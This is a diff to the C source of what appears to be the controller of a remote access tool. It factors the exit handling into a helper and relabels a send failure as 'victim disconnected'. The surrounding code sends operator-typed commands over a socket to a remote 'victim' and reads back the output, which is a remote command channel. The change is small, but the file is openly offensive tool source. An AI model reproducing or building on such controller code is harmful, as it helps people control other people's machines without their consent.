@@ -55,6 +55,14 @@ void	recv_auth_error(s_red red)
 		write(2, RATZ_IOCTL_ER, strlen(RATZ_IOCTL_ER));
 }
 
+static inline
+void	exit_interpret(s_red* red)
+{
+	printf("exit\n");
+	write(red->ratz.server, "exit\n", 6);
+	red->killed = 1;
+}
+
 int	main(int unused, char** av)
 {
 	(void)unused;
@@ -76,23 +84,15 @@ int	main(int unused, char** av)
 	{
 		red.buffer = readline(RATZ_PROMPT);
 		if (!red.buffer)
-		{
-			printf("exit\n");
-			write(red.ratz.server, "exit\n", 6);
-			red.killed = 1;
-		}
+			exit_interpret(&red);
 		else if (red.buffer[0])
 		{
 			if (!strcmp(red.buffer, "exit"))
-			{
-				printf("exit\n");
-				write(red.ratz.server, "exit\n", 6);
-				red.killed = 1;
-			}
+				exit_interpret(&red);
 			else if (strcmp(red.buffer, "\003"))
 			{
 				if (write(red.ratz.server, red.buffer, strlen(red.buffer)) <= 0)
-					strexit("send", 0);
+					strexit("victim disconnected", 0);
 				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) & ~O_NONBLOCK);
 				n = read(red.ratz.server, output, sizeof(output));
 				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) | O_NONBLOCK);
